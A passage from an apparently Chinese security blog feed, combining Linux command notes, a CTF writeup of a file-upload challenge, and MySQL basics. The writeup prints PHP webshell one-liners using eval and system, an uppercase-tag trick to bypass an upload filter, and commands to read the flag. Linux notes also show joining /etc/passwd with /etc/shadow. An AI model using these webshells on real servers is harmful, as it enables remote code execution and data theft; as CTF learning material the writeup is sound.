<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 查看 /etc/protocols 中的不可见字符，可以看到很多 ^I ，这其实就是 Tab 转义成可见字符的符号</div><div class="line">$ cat -A /etc/protocols</div><div class="line"># 使用 col -x 将 /etc/protocols 中的 Tab 转换为空格,然后再使用 cat 查看，你发现 ^I 不见了</div><div class="line">$ cat /etc/protocols | col -x | cat -A</div></pre></td></tr></table></figure>
<h3 id="join-命令"><a href="#join-命令" class="headerlink" title="join 命令"></a>join 命令</h3><p>将两个文件中包含相同内容的那一行合并在一起</p>
<table>
<thead>
<tr>
<th>选项</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-t</td>
<td style="text-align:left">指定分隔符，默认为空格</td>
</tr>
<tr>
<td>-i</td>
<td style="text-align:left">忽略大小写的差异</td>
</tr>
<tr>
<td>-1</td>
<td style="text-align:left">指明第一个文件要用哪个字段来对比，，默认对比第一个字段</td>
</tr>
<tr>
<td>-2</td>
<td style="text-align:left">指明第二个文件要用哪个字段来对比，，默认对比第一个字段</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># 创建两个文件</div><div class="line">$ echo &apos;1 hello&apos; &gt; file1</div><div class="line">$ echo &apos;1 shiyanlou&apos; &gt; file2</div><div class="line">$ join file1 file2</div><div class="line"># 将/etc/passwd与/etc/shadow两个文件合并，指定以&apos;:&apos;作为分隔符</div><div class="line">$ sudo join -t&apos;:&apos; /etc/passwd /etc/shadow</div><div class="line"># 将/etc/passwd与/etc/group两个文件合并，指定以&apos;:&apos;作为分隔符, 分别比对第4和第3个字段</div><div class="line">$ sudo join -t&apos;:&apos; -1 4 /etc/passwd -2 3 /etc/group</div></pre></td></tr></table></figure>
<h3 id="paste命令"><a href="#paste命令" class="headerlink" title="paste命令"></a>paste命令</h3><p>在不对比数据的情况下，简单地将多个文件合并一起，以Tab隔开</p>
<table>
<thead>
<tr>
<th>选项</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-d</td>
<td style="text-align:left">指定合并的分隔符，默认为Tab</td>
</tr>
<tr>
<td>-s</td>
<td style="text-align:left">不合并到一行，每个文件为一行</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ echo hello &gt; file1</div><div class="line">$ echo shiyanlou &gt; file2</div><div class="line">$ echo www.shiyanlou.com &gt; file3</div><div class="line">$ paste -d &apos;:&apos; file1 file2 file3</div><div class="line">$ paste -s file1 file2 file3</div></pre></td></tr></table></figure>
<h1 id="Linux下软件安装"><a href="#Linux下软件安装" class="headerlink" title="Linux下软件安装"></a>Linux下软件安装</h1><h2 id="linxu上的软件安装"><a href="#linxu上的软件安装" class="headerlink" title="linxu上的软件安装"></a>linxu上的软件安装</h2><p>通常Linux上的软件安装主要有三种方式：</p>
<ul>
<li>在线安装</li>
<li>从磁盘安装deb软件包</li>
<li>从二进制软件包安装</li>
<li>从源代码编译安装</li>
</ul>
<h2 id="在线安装"><a href="#在线安装" class="headerlink" title="在线安装"></a>在线安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install tools</div></pre></td></tr></table></figure>
<p>apt-get包含的常用的一些工具</p>
<table>
<thead>
<tr>
<th>工具</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>install</td>
<td style="text-align:left">其后加上软件包名，用于安装一个软件包</td>
</tr>
<tr>
<td>update</td>
<td style="text-align:left">从软件源镜像服务器上下载/更新用于更新本地软件源的软件包列表</td>
</tr>
<tr>
<td>upgrade</td>
<td style="text-align:left">升级本地可更新的全部软件包，但存在依赖问题时将不会升级，通常会在更新之前执行一次update</td>
</tr>
<tr>
<td>dist-upgrade</td>
<td style="text-align:left">解决依赖关系并升级(存在一定危险性)</td>
</tr>
<tr>
<td>remove</td>
<td style="text-align:left">移除已安装的软件包，包括与被移除软件包有依赖关系的软件包，但不包含软件包的配置文件</td>
</tr>
<tr>
<td>autoremove</td>
<td style="text-align:left">移除之前被其他软件包依赖，但现在不再被使用的软件包</td>
</tr>
<tr>
<td>purge</td>
<td style="text-align:left">与remove相同，但会完全移除软件包，包含其配置文件</td>
</tr>
<tr>
<td>clean</td>
<td style="text-align:left">移除下载到本地的已经安装的软件包，默认保存在/var/cache/apt/archives/</td>
</tr>
<tr>
<td>autoclean</td>
<td style="text-align:left">移除已安装的软件的旧版本软件包</td>
</tr>
</tbody>
</table>
<p>apt-get常用的参数 </p>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-y</td>
<td style="text-align:left">自动回应是否安装软件包的选项，在一些自动化安装脚本中使用这个参数将十分有用</td>
</tr>
<tr>
<td>-s</td>
<td style="text-align:left">模拟安装</td>
</tr>
<tr>
<td>-q</td>
<td style="text-align:left">静默安装方式，指定多个q或者-q=#,#表示数字，用于设定静默级别，这在你不想要在安装软件包时屏幕输出过多时很有用</td>
</tr>
<tr>
<td>-f</td>
<td style="text-align:left">修复损坏的依赖关系</td>
</tr>
<tr>
<td>-d</td>
<td style="text-align:left">只下载不安装</td>
</tr>
<tr>
<td>–reinstall</td>
<td style="text-align:left">重新安装已经安装但可能存在问题的软件包</td>
</tr>
<tr>
<td>–install-suggests</td>
<td style="text-align:left">同时安装APT给出的建议安装的软件包</td>
</tr>
</tbody>
</table>
<h3 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get --reinstall install  &lt;软件包名&gt;</div></pre></td></tr></table></figure>
<h3 id="软件升级"><a href="#软件升级" class="headerlink" title="软件升级"></a>软件升级</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># 更新软件源</div><div class="line">$ sudo apt-get update</div><div class="line"># 升级没有依赖问题的软件包</div><div class="line">$ sudo apt-get upgrade</div><div class="line"># 升级并解决依赖关系</div><div class="line">$ sudo apt-get dist-upgrade</div></pre></td></tr></table></figure>
<h3 id="卸载软件"><a href="#卸载软件" class="headerlink" title="卸载软件"></a>卸载软件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get remove w3m</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># 不保留配置文件的移除</div><div class="line">$ sudo apt-get purge w3m</div><div class="line"># 或者 sudo apt-get --purge remove</div><div class="line"># 移除不再需要的被依赖的软件包</div><div class="line">$ sudo apt-get autoremove</div></pre></td></tr></table></figure>
<h3 id="软件搜索"><a href="#软件搜索" class="headerlink" title="软件搜索"></a>软件搜索</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-cache search softname1 softname2 softname3……</div></pre></td></tr></table></figure>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[百度杯CTF比赛Writeup]]></title>
      <url>http://uknowsec.cn/posts/ctf/%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E6%AF%94%E8%B5%9BWriteup.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>i春秋和百度联合推出的一个CTF比赛，由于本人太菜。只能随便玩玩，多学多问。<br><img src="http://obr4sfdq7.bkt.clouddn.com/psb.jpg" alt=""></p>
<h2 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h2><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>Upload<br>描述：想怎么传就怎么传，就是这么任性。<br>tips:flag在flag.php中    </p>
<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>打开题目题目链接，是一个文件上传的题。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903224648.png" alt=""><br>然后打开/flag.php<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903224800.png" alt=""><br>直接上传传统的PHP一句话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php eval_r($_POST[sb])?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903225057.png" alt=""><br>发现过滤了 &lt;?php</p>
<p>然后在网上找到了另一种php一句话的木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt; //绕过&lt;?限制的一句话</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903225859.png" alt=""><br>查看源码显示过滤了php</p>
<p>php改为PHP继续上传<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903230202.png" alt=""><br>查看源码没有显示</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8721.png" alt=""><br>找这里就没思路了，吃饭。去图书馆，下午回来问问大表哥</p>
<p>表哥告诉我不要传传统的PHP一句话<br>换个姿势，然后告诉我 PHP有4种开始和结束标记<br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8717.png" alt=""><br>果断百度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.</div><div class="line">&lt;?php echo &apos;if you want to serve XHTML or XML documents, do like this&apos;; ?&gt;</div><div class="line"></div><div class="line">2.</div><div class="line">&lt;script language=&quot;php&quot;&gt;</div><div class="line">echo &apos;some editors (like FrontPage) don&apos;t</div><div class="line">like processing instructions&apos;;</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line">3.</div><div class="line">&lt;? echo &apos;this is the simplest, an SGML processing instruction&apos;; ?&gt;</div><div class="line">&lt;?= expression ?&gt; This is a shortcut for &quot;&lt;? echo expression ?&gt;&quot;</div><div class="line"></div><div class="line">4.</div><div class="line">&lt;% echo &apos;You may optionally use ASP-style tags&apos;; %&gt;</div><div class="line">&lt;%= $variable; # This is a shortcut for &quot;&lt;% echo . . .&quot; %&gt;</div></pre></td></tr></table></figure></p>
<p>发现第二种上午用过，但是不行<br>表哥说换个姿势，用system()函数调用系统命令<br>由于个人能力太差，写了半天才写出一句话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script language=&quot;PHP&quot;&gt;system($_GET[id])&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>PHP大写绕过，上传！<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903231450.png" alt=""><br>执行3.php?id=ls<br>发现php_errors.log日志文件，找到表哥说的绝对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/var/www/html/u</div></pre></td></tr></table></figure></p>
<p>然后表哥说直接命令查就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pwd  //同样得到 /var/www/html/u</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8717.png" alt=""><br>然后利用cat 查看文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">1．命令格式：</div><div class="line"></div><div class="line">cat [选项] [文件]...</div><div class="line"></div><div class="line">2．命令功能：</div><div class="line"></div><div class="line">cat主要有三大功能：</div><div class="line"></div><div class="line">1.一次显示整个文件:cat filename</div><div class="line"></div><div class="line">2.从键盘创建一个文件:cat &gt; filename 只能创建新文件,不能编辑已有文件.</div><div class="line"></div><div class="line">3.将几个文件合并为一个文件:cat file1 file2 &gt; file</div><div class="line"></div><div class="line">3．命令参数：</div><div class="line"></div><div class="line">-A, --show-all           等价于 -vET</div><div class="line"></div><div class="line">-b, --number-nonblank    对非空输出行编号</div><div class="line"></div><div class="line">-e                       等价于 -vE</div><div class="line"></div><div class="line">-E, --show-ends          在每行结束处显示 $</div><div class="line"></div><div class="line">-n, --number     对输出的所有行编号,由1开始对所有输出的行数编号</div><div class="line"></div><div class="line">-s, --squeeze-blank  有连续两行以上的空白行，就代换为一行的空白行 </div><div class="line"></div><div class="line">-t                       与 -vT 等价</div><div class="line"></div><div class="line">-T, --show-tabs          将跳格字符显示为 ^I</div><div class="line"></div><div class="line">-u                       (被忽略)</div><div class="line"></div><div class="line">-v, --show-nonprinting   使用 ^ 和 M- 引用，除了 LFD 和 TAB 之外</div></pre></td></tr></table></figure></p>
<p>根据上面的知识，构建下面的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.../u/3.php?id=cat /var/www/html/flag.php</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903232502.png" alt=""><br>查看源码得到flag,唉！不容易，自己的知识太少了。</p>
<h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p>flag{90969a8b-9e19-4247-8654-a10eeeb48314}</p>
<h4 id="此题小结"><a href="#此题小结" class="headerlink" title="此题小结"></a>此题小结</h4><p>才发现做个CTF不是那么容易的，一个看起来简单的上传绕过的题目。包含了PHP，Linxu系统命令，等等很多内容。也发现了自己有很多不足。幸亏有表哥的帮助，在此感觉依风表哥帮助和指导，下面两个题等明天在看别人的Writeup或者请教表哥吧！</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[MySQL数据库基础与实例]]></title>
      <url>http://uknowsec.cn/posts/notes/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%AE%9E%E4%BE%8B.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="MySQL基础知识"><a href="#MySQL基础知识" class="headerlink" title="MySQL基础知识"></a>MySQL基础知识</h1><p>MySQL是最受欢迎的开源关系数据库管理系统，有瑞典MySQL AB公司开发。2008年1月MySQL被美国的SUN公司收购，2009年4月SUN公司又被美国的甲骨文（Oracle）公司收购。</p>
<h2 id="MySQL的特点"><a href="#MySQL的特点" class="headerlink" title="MySQL的特点"></a>MySQL的特点</h2><p>MySQL是一个单进程多线程、支持多用户、基于客户机/服务端（Client/Server， C/S）的关系数据库管理系统。与其他数据库管理系统（DBMS）相比，MySQL具有体积小、易于安装、运行速度快、功能齐全、成本低廉、开源、性能高效、跨平台支持、简单易用以及支持多用户等特点。</p>
<h2 id="MySQL服务器的安装"><a href="#MySQL服务器的安装" class="headerlink" title="MySQL服务器的安装"></a>MySQL服务器的安装</h2><p><a href="https://www.baidu.com/s?ie=utf-8&amp;f=3&amp;rsv_bp=1&amp;tn=monline_3_dg&amp;wd=mysql%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B&amp;oq=MySQL%E7%9A%84%E4%BD%BF%E7%94%A8%E6%B5%81%E7%A8%8B%E5%9B%BE&amp;rsv_pq=b00d663c00006bf5&amp;rsv_t=b75foeWyNzqw1JsrhOMySTBjWEBnJT3RNpfrmv8xNT4d2xAaW4fs%2FO1%2BnJwFxWv%2BPzR6&amp;rqlang=cn&amp;rsv_enter=1&amp;inputT=4620&amp;rsv_sug3=36&amp;rsv_sug1=16&amp;rsv_sug7=100&amp;rsv_sug2=1&amp;prefixsug=MySQL%E5%AE%89%E8%A3%85&amp;rsp=0&amp;rsv_sug4=7744" target="_blank" rel="external">mysql安装教程</a></p>
<h2 id="启动与停止MySQL服务"><a href="#启动与停止MySQL服务" class="headerlink" title="启动与停止MySQL服务"></a>启动与停止MySQL服务</h2><p>方法一：“开始”-&gt;“运行”，输入“service.msc”<br>方法二：“我的电脑”-&gt;“管理”-&gt;“计算机管理”-&gt;“服务和应用程序”-&gt;“服务”<br>方法三：使用Windows操作系统的控制面板也可以找到“服务”窗口。<br>方法四：“开始”-&gt;“运行”-&gt;“输入cmd”-&gt;“net start mysql开启或net stop mysql”</p>
<h2 id="连接MySQL服务器"><a href="#连接MySQL服务器" class="headerlink" title="连接MySQL服务器"></a>连接MySQL服务器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql -h 127.0.0.1 -P 3306 -u root -proot </div><div class="line">mysql -h 127.0.0.1 -u root -p </div><div class="line"></div><div class="line">-h : host MySQL服务器主机名或者IP地址</div><div class="line">-P : Port MySQL服务的端口号，如果是默认端口3306，则 -P 参数可以省略</div><div class="line">-u : user MySQL账号名</div><div class="line">-p : pwd MySQL账户名对应的密码</div></pre></td></tr></table></figure>
<p>每条MySQL命令或者SQL语句应该以“;”或者“\g”结束<br>键入“help;”或者“\h”命令，即可查看帮助信息。</p>
<h2 id="字符集及字符序"><a href="#字符集及字符序" class="headerlink" title="字符集及字符序"></a>字符集及字符序</h2><p>字符（character）是人类语言最小的表义符号，给定一系列字符，并对每个字符赋予一个数值，用数值来代表对应的字符，这个数值就是字符的编码（character encoding），给定一系列字符并赋予对应的编码后，所有这些“字符和编码对”组成的集合就是字符集（character set）。<br>字符序（collation）是指在统一字符之内的比较规则。一个字符集可以包含多种字符序，每个字符集有一个默认的字符序（default collation），每一个字符唯一对应一种字符。MySQL字符序命名规则是：以字符序对应的字符集名称开头，以国家名居中（或以general居中），以ci、cs或bin结尾。以ci结尾的字符序表示大小写不敏感，以cs结尾的字符序表示大小写敏感。</p>
<h2 id="MySQL字符集与字符序"><a href="#MySQL字符集与字符序" class="headerlink" title="MySQL字符集与字符序"></a>MySQL字符集与字符序</h2><p>MySQL为了节省存储空间，在默认情况下，一个gbk英文字符通常仅占用一个字节（8位）的存储空间，一个utf8英文字符仅占用一个字节（8位）的存储空间。<br>MySQL客户机成功连接MySQL服务器后，使用MySQL命令“show character set;”即可查看当前MySQL服务实例支持的字符集、字符集默认的字符序以及字符集占用的最大字节长度等信息。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720160902190951.png" alt=""><br>使用MySQL命令“show variables like ‘character%’;”即可查看当前MySQL会话使用的字符集。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160902191609.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">character_set_client：MySQL客户机的字符集</div><div class="line">character_set_connection：数据通信链路的字符集，当MySQL客户机向服务器发送请求时，请求数据以该字符集进行编码。</div><div class="line">character_set_database：数据库字符集。</div><div class="line">character_set_filesystem：MySQL服务器文件系统的字符集，该值是固定的binary.</div><div class="line">character_set_result：结果集的字符集，MySQL服务器向MySQL客户机返回执行结果时，执行结果以该字符集进行编码。</div><div class="line">character_set_server：MySQL服务实例字符集。</div><div class="line">character_set_system：元数据（字段名、表名、数据库名等）的字符集。</div></pre></td></tr></table></figure></p>
<h2 id="MySQL字符集的设置"><a href="#MySQL字符集的设置" class="headerlink" title="MySQL字符集的设置"></a>MySQL字符集的设置</h2><p>方法：修改my.ini配置文件，可修改MySQL默认的字符集。</p>
<h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">使用SQL语句“create database database_name;”</div></pre></td></tr></table></figure>
<p>创建数据库后，MySQL服务实例自动在 ·\·\date\ 目录创建“database_name”目录及相关数据库文件（如db.opt）<br>db.opt文件的主要功能是记录当前数据库的默认字符集及字符序等信息。</p>
<h2 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">使用MySQL命令“show datadases;&quot;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160902193439.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">information_schema:用于收集MySQL服务器的性能参数，确保了数据安全。</div><div class="line">performance_schema:用于收集MySQL服务器的性能参数，以便数据库管理员了解产生性能瓶颈的原因。</div><div class="line">information_schema系统数据库定义了所有数据库对象的元数据信息。例如所有数据库、表、字段、索引、约束、权限、存储引擎、字符集和触发器等信息都存储在information_schema数据库中。</div><div class="line">系统数据库由MySQL服务实例进程自动维护，普通用户建议不要修改系统数据库信息。</div></pre></td></tr></table></figure>
<h2 id="显示数据库结构"><a href="#显示数据库结构" class="headerlink" title="显示数据库结构"></a>显示数据库结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">使用MySQL命令“show create database database_name;&quot;</div></pre></td></tr></table></figure>
<p>可以查看名database_name数据库的结构。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160902194504.png" alt=""></p>
<h2 id="选择当前操作的数据库"><a href="#选择当前操作的数据库" class="headerlink" title="选择当前操作的数据库"></a>选择当前操作的数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">使用SQL语句“use database_name;&quot;</div></pre></td></tr></table></figure>
<h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">使用MySQL命令“drop database database_name;&quot;</div></pre></td></tr></table></figure>
<p>删除数据库后，MySQL服务实例会自动删除数据库目录及该数据库目录中的所有文件，数据库一旦删除，保存在该数据库中的数据将全部丢失。</p>
<h2 id="MyISAM和InnoDB存储引擎"><a href="#MyISAM和InnoDB存储引擎" class="headerlink" title="MyISAM和InnoDB存储引擎"></a>MyISAM和InnoDB存储引擎</h2><p>MySQL提供了插件式（pluggable）的存储引擎，存储引擎是基于表的。同一数据库，不同的表，存储引擎可以不同。甚至，同一个数据库表在不同的场合可以应用不同的存储引擎。目前，MySQL的存储引擎至少10种，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">使用MySQL命令“show engines;”</div></pre></td></tr></table></figure></p>
<p>即可查看MySQL服务实例支持的存储引擎。<br>MySQL常用的存储引擎有InnoDB存储引擎以及MyISAM存储引擎。</p>
<h3 id="InnoDB存储引擎"><a href="#InnoDB存储引擎" class="headerlink" title="InnoDB存储引擎"></a>InnoDB存储引擎</h3><p>InnoDB存储引擎是事务（transaction）安全的，并且支持外键（foreign key）。如果某张表主要提供OLTP支持，需要执行大量的增、删、该操作（即insert、delete、update语句），处于事务安全方面的考虑，InnoDB存储引擎是更好的选择。</p>
<h3 id="MyISAM存储引擎"><a href="#MyISAM存储引擎" class="headerlink" title="MyISAM存储引擎"></a>MyISAM存储引擎</h3><p>如果某张表主要提供OLAP支持，建议用MyISAM存储引擎。MyISAM具有检查和修复表的大多数工具。MyISAM表可以被压缩，而且最早支持全文索引，但MyISAM表不是事务安全的，也不支持外键。如果某表需要执行大量的select语句，出狱性能方面的考虑，MyISAM存储引擎是更好的选择。</p>
<h2 id="设置默认的存储引擎"><a href="#设置默认的存储引擎" class="headerlink" title="设置默认的存储引擎"></a>设置默认的存储引擎</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">使用MySQL命令“set default_storage_engine=MyISAM;&quot; 可以“临时地”将MySQL“当前会话的”存储引擎设置为MySIAM。</div><div class="line">使用MySQL命令“show engines;”查看当前引擎</div></pre></td></tr></table></figure>
<p>修改my.ini配置文件中的[mysqld]选项组中的default-storage-engine的参数值，并重启服务。可以“永久性”修改。</p>
<h2 id="创建数据库表"><a href="#创建数据库表" class="headerlink" title="创建数据库表"></a>创建数据库表</h2><p>表是数据库中最为重要的数据库对象。创建表前，需要根据数据库涉及的结果确定表名、字段名及数据类型、约束等信息，另外，还要为每张表选择一个合适的存储引擎。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">use choose；</div><div class="line">set default_storage_engine=InnoDB;</div><div class="line">create table my_table(</div><div class="line">today datetiome,</div><div class="line">name char(20)</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>对于InnoDB存储引擎的表而言，MySQL服务实例会在数据库目录自动创建一个名为表名、后缀名为frm的表结构定义文件my_table.frm。<br>对于MyISAM,MySQL服务实例除了自动创建frm表结构文件外，还会自动创建一个文件名为表名、后缀名为MYD的数据文件以及文件名为表名、后缀名为MYI的索引文件。</p>
<h2 id="显示表结构"><a href="#显示表结构" class="headerlink" title="显示表结构"></a>显示表结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">使用MySQL命令“show tables;&quot;即可查看当前操作的数据库中所有的表。</div><div class="line">使用MySQL命令“describe table_name;&quot;即可查看表名为table_name的表结构（describe也可以简写为desc）</div><div class="line">使用MySQL命令“show create table table_name;&quot;查看名为table_name表的详细信息。</div></pre></td></tr></table></figure>
<h2 id="表记录的管理"><a href="#表记录的管理" class="headerlink" title="表记录的管理"></a>表记录的管理</h2><p>表记录的管理包括表记录的更新操作以及表记录的查询操作（select），其中，表记录的更新操作包括表记录的插入（insert）、修改（update）以及删除（delete）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use choose;</div><div class="line">insert into my_table values(now(),&apos;a&apos;);</div><div class="line">insert into my_table values(now(),&apos;a&apos;);</div><div class="line">insert into my_table values(now(),NULL);</div><div class="line">insert into my_table values(now(),&apos;&apos;);</div></pre></td></tr></table></figure></p>
<p>now()函数返回MySQL服务器的当前日期以及时间。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">使用MySQL命令“delect*from tables_name”负责查询table_name表中的所有记录。</div></pre></td></tr></table></figure>
<p>NULL与空字符串“‘’”是两个不同的概念。<br>NULL与整数零以及空格字符“‘ ’”的概念也不同。</p>
<p>MyISAM表的备份只需将整个数据库目录复制一份即可。<br>InnoDB表的备份不仅需要复制整个数据库目录，还需要复制ibdata1表空间文件，以及重做日志文件ib_lagfile1。</p>
<h2 id="InnoDB-表空间"><a href="#InnoDB-表空间" class="headerlink" title="InnoDB 表空间"></a>InnoDB 表空间</h2><p>InnoDB表空间分为共享表空间与独享表空间。</p>
<h3 id="共享表空间"><a href="#共享表空间" class="headerlink" title="共享表空间"></a>共享表空间</h3><p>MySQL服务实例承载的所有数据库的所有InnoDB表的数据信息、索引信息、各种元数据信息以及事务的回滚（UNDO）信息，全部存放在共享空间文件中。</p>
